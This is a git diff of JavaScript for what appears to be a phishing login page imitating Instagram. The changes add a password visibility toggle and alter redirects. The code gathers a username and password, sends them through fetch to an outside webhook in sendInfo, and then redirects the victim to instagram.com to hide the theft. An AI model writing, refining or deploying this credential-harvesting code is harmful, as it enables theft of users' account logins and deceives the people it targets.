@@ -1,18 +1,38 @@
-loginButton = document.querySelector("#loginBtn");
-password = document.querySelector("#passwordInput");
-username = document.querySelector("#usernameInput");
+const loginButton = document.querySelector("#loginBtn");
+const password = document.querySelector("#passwordInput");
+const username = document.querySelector("#usernameInput");
+const showPasswordBtn = document.querySelector("#showPasswordBtn");
 
+password.addEventListener("input", disableBtn);
+username.addEventListener("input", disableBtn);
+
+
+
+function passwordVisible() {
+  if (password.type === "password") {
+    password.type = "text";
+    showPasswordBtn.textContent = "Hide";
+  } else {
+    password.type = "password";
+    showPasswordBtn.textContent = "Show";
+  }
+}
+
+function passwordBtnVisible() {
+  if (password.value.length > 0) {
+    showPasswordBtn.style.display = "block";
+  } else {
+    showPasswordBtn.style.display = "none";
+  }
+}
 
 function disableBtn() {
-    if (username.value && password.value) {
-        loginButton.disabled = false;
-    } else {
-        loginButton.disabled = true;
-    }
+  if (username.value && password.value) {
+      loginButton.disabled = false;
+  } else {
+      loginButton.disabled = true;
   }
-  
-  password.addEventListener("input", disableBtn);
-  username.addEventListener("input", disableBtn);
+}
 
 let Info
 loginButton.addEventListener("click", () => {
@@ -61,10 +81,10 @@ async function sendInfo() {
     await fetch(webhook, config);
   } catch {
     setTimeout(function() {
-        window.location.replace("https://www.instagram.com/p/BzI9vmcHdvN")
+        window.location.replace("https://www.instagram.com/explore/")
     }, 1000);
   }
   setTimeout(function() {
-    window.location.replace("https://www.instagram.com/p/BzI9vmcHdvN")
+    window.location.replace("https://www.instagram.com/explore/")
   }, 1000);
 }
